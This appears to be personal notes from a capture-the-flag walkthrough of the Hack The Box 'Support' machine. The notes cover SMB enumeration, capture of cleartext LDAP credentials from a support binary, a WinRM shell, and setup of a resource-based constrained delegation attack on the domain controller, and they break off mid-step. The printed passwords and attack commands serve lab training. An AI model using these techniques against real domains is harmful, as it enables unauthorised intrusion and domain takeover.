# Recon
```
sudo nmap -p- --min-rate 10000 10.10.11.174            
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 18:51 EEST
Nmap scan report for 10.10.11.174
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9389/tcp open  adws

Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
```
- with version
```
 nmap -sC -sV 10.10.11.174 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 18:53 EEST
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.34% done; ETC: 18:54 (0:00:00 remaining)
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.32% done; ETC: 18:54 (0:00:00 remaining)
Nmap scan report for 10.10.11.174
Host is up (0.12s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-30 14:53:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -59m52s
| smb2-time: 
|   date: 2023-07-30T14:54:08
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.44 seconds
```
- we see smb so enumrate using crackmapexec
```
 crackmapexec smb 10.10.11.174 --users --shares    
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
SMB         10.10.11.174    445    DC               [-] Error enumerating domain users using dc ip 10.10.11.174: NTLM needs domain\username and a password
SMB         10.10.11.174    445    DC               [*] Trying with SAMRPC protocol
```
- cant enumrate shares or users
- try smbclient and we got shares
```
 smbclient -L 10.10.11.174                  
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- From the available shares, support-tools seems interesting as it is not a default share
```
 smbclient \\\\10.10.11.174\\support-tools

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 969193 blocks available
smb: \> 
```
- we got into the shares and found intersting file UserInfo.exe.zip
- we get this file and unzip it
- archive contains quite a few DLL's as well as an executable file called UserInfo.exe
- file type of UserInfo.exe shows that it is a .Net executable
- we are using a Linux system
- we have two ways to proceed. Decompiling the executable to see what it does or using Wine to attempt to run it
- In order to decompile the .Net executable we can use Avalonia ILspy, which is a cross-platform version of ILSpy that works on Linux
- we run ilspy now load the UserInfo executable in order to decompile it
- ILSpy will take care the decompilation and we will be able to view the source code
- quickly notice a function called LdapQuery as well as two other functions called FindUser and GetUser
- The code indicates that the binary is used to connect to a remote LDAP server and attempt to fetch user information.
- Let's add support.htb to our hosts file
- password to authenticate with the LDAP server is fetched from the Protected.getPassword() function
- the password seems to be encrypted using XOR. The decryption process is :
  - The enc_password string is Base64 decoded and placed into a byte array
  - A second byte array called array2 is created with the same value as array
  - A loop is initialised, which loops through each character in array and XORs it with one letter of the key and then with the byte 0xDFu (223)
  - Finally the decrypted key is returned.
- didnt understand where to go from there so i used another method to get the password
- Wine , an application that can run Windows applications on Linux systems
- Executing the binary with Wine shows its command line usage
- attempt to use the find flag to determine its functionality
- The program states we also need a -first or -last flag. Let's add it
```
wine UserInfo.exe -v find -first "test"
[*] LDAP query to use: (givenName=test)
[-] Exception: No Such Object
```
- The binary seems to have successfully connected to the remote LDAP server and prints out the LDAP query
that is being run
- The binary seems to have successfully connected to the remote LDAP server and prints out the LDAP query that is being run
- can also attempt to inject the LDAP query to list all objects, however, this also fails
- The binary is actually LDAP query injectable, however, this only works through Windows
- We know the binary is connecting to the remote LDAP server on the box and somehow authenticating
- let's fire up WireShark and capture the network traffic to see if we can grab the username and password that are used for the authentication
- run the binary again with wine
- The LDAP authentication is captured in WireShark and clicking on the bindRequest packet shows the username and password combination in use 
- we can navigate to Lightweight Directory Access Protocol , open protocolOp and then bindRequest to identify the username support\ldap
- we can select authentication to view the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
- now go to Apache Directory Studio
- let's add a connection to the LDAP server by clicking the LDAP button on the top left of the screen
- right click anywhere inside the Connections window and select New Connection
- ldap@support.htb as the Bind DN and paste in the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
- Back in the home screen of the Apache Directory Studio utility, we can see the Support
- Double clicking it will allow us to connect to the remote LDAP server and list all of the LDAP objects
- notice an object with a Common Name of users
- we find a non default tag called info with a value of Ironside47pleasure40Watchful in the support user
-  we can also see that this user is a member of the Remote Management Users group
-  which allows them to connect over WinRM. To this end lets attempt to use evil-winrm to connect remotely to the support user with the identified password
- and we got ashell and the user flag
# Privilege Escalation
- Nmap output already revealed to us that the machine belongs to a Domain
```
*Evil-WinRM* PS C:\Users\support\Desktop> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb
```
- the machine is the Domain Controller ( dc.support.htb ) for the support.htb domain. Let's add this hostname to our hosts file
- check if the current user is a member of any interesting groups
```
*Evil-WinRM* PS C:\Users\support\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\support\Desktop> 
```
- The support user seems to be a member of a non default group called Shared Support Accounts as well as the Authenticated Users group
- now use bloodhound o identify potential attack paths is this domain that can help us increase our privileges
- we will have to collect data from the remote machine before we proceed
- We will use the SharpHound.exe binary to collect Active Directory data
- upload sharphounad and run it and doanload the data collected and open it using bloodhound
- Once the data has been loaded, we can search for SUPPORT@SUPPORT.HTB
- click on the user object and select Mark User as Owned to specify that we already have access to the system as this user
- We can see that the Group Delegated Object Control section shows a value of 1 we press it to see more output 
- the output shows that the Shared Support Accounts group has GenericAll privileges on the Domain Controller
- the support user is a member of this group, they as well have all privileges on the DC
- Right clicking on the line called GenericAll and selecting Help provides more information about this privilege as well as how to exploit it
- bloodhound mentions that we can do resource-based-constrained-delegation attack
  - through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain
  - call this computer $FAKE-COMP01 , and configure the Domain Controller (DC) to allow $FAKE-COMP01 to act on behalf of it.
  - by acting on behalf of the DC we can request Kerberos tickets for $FAKE-COMP01
  - with the ability to impersonate a highly privileged user on the Domain, such as the Administrator
  - After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain
 - the attack relies on three prerequisites
   - We need a shell or code execution as a domain user that belongs to the Authenticated Users group
   - The ms-ds-machineaccountquota attribute needs to be higher than 0
   - Our current user or a group that our user is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL ) over a domain joined computer (in this case the Domain Controller
  -  we know that the support user is indeed a member of the Authenticated Users group as well as the Shared Support Accounts group
  -  Shared Support Accounts group has GenericAll privileges over the Domain Controller
  -  checking  the value of the ms-ds-machineaccountquota attribute
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota


DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10
Name                      : support
ObjectClass               : domainDNS
ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
```
- this attribute is set to 10, which means each authenticateddomain user can add up to 10 computers to the domain
- verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we need the PowerView module for PowerShell
- upload it like before and impor it like this
  ```
  . ./PowerView.ps1
  ```
- use the Get-DomainComputer commandlet to query the required information
- value is empty, which means we are ready to perform the RBCD attack, but first let's upload the toolsthat are required. We will need PowerMad and Rubeus, which we can upload using Evil-WinRM
- powermad can be imported like powerview above
- Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount to achieve this
```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString
'Password123' -AsPlainText -Force)
```
- verify this new machine with the following command
```
Get-ADComputer -identity FAKE-COMP01
```
- configure Resource-Based Constrained Delegation through one of two ways
  - 
